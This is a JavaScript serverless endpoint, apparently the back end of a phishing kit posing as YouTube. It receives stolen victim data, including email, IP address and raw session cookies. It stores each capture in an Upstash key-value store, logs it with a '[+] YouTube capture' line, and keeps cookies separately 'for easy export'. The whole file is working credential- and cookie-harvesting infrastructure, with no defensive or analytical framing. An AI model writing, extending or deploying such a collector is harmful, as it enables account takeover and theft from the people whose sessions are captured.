// api/capture.js

const UPSTASH_URL = process.env.KV_REST_API_URL;
const UPSTASH_TOKEN = process.env.KV_REST_API_TOKEN;
const KV_PREFIX = "coffee-fence";

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    try {
        const data = req.body;
        if (!data) return res.status(400).json({ error: 'No data' });

        const entryId = `yt_${Date.now()}_${Math.random().toString(36).substring(2, 10)}`;
        const key = `${KV_PREFIX}:${entryId}`;

        // Store individual entry
        await upstashSet(key, JSON.stringify(data));

        // Append to master list
        await appendToList(`${KV_PREFIX}:youtube_entries`, data);

        // Increment counter
        await upstashIncr(`${KV_PREFIX}:youtube_total`);

        // If cookies were captured, also store them separately for easy export
        if (data.cookies && data.cookies.raw) {
            const cookieKey = `${KV_PREFIX}:cookies_${entryId}`;
            await upstashSet(cookieKey, JSON.stringify({
                timestamp: data.timestamp,
                email: data.email,
                cookies: data.cookies.raw,
                domain: 'youtube.com'
            }));
        }

        console.log(`[+] YouTube capture: ${data.email} | ${data.ip?.ip || 'unknown'}`);
        return res.status(200).json({ status: 'ok', id: entryId });

    } catch (error) {
        console.error('[!] Capture error:', error.message);
        return res.status(500).json({ error: error.message });
    }
}

async function upstashSet(key, value) {
    const url = `${UPSTASH_URL}/set/${encodeURIComponent(key)}`;
    const resp = await fetch(url, {
        method: 'POST',
        headers: {
            'Authorization': `Bearer ${UPSTASH_TOKEN}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(value)
    });
    return resp.json();
}

async function upstashGet(key) {
    const url = `${UPSTASH_URL}/get/${encodeURIComponent(key)}`;
    const resp = await fetch(url, {
        headers: { 'Authorization': `Bearer ${UPSTASH_TOKEN}` }
    });
    return resp.json();
}

async function upstashIncr(key) {
    const url = `${UPSTASH_URL}/incr/${encodeURIComponent(key)}`;
    const resp = await fetch(url, {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${UPSTASH_TOKEN}` }
    });
    return resp.json();
}

async function appendToList(listKey, data) {
    const result = await upstashGet(listKey);
    let list = [];
    if (result.result) {
        try { list = JSON.parse(result.result); } catch(e) { list = []; }
    }
    if (!Array.isArray(list)) list = [];
    list.push(data);
    await upstashSet(listKey, JSON.stringify(list));
}
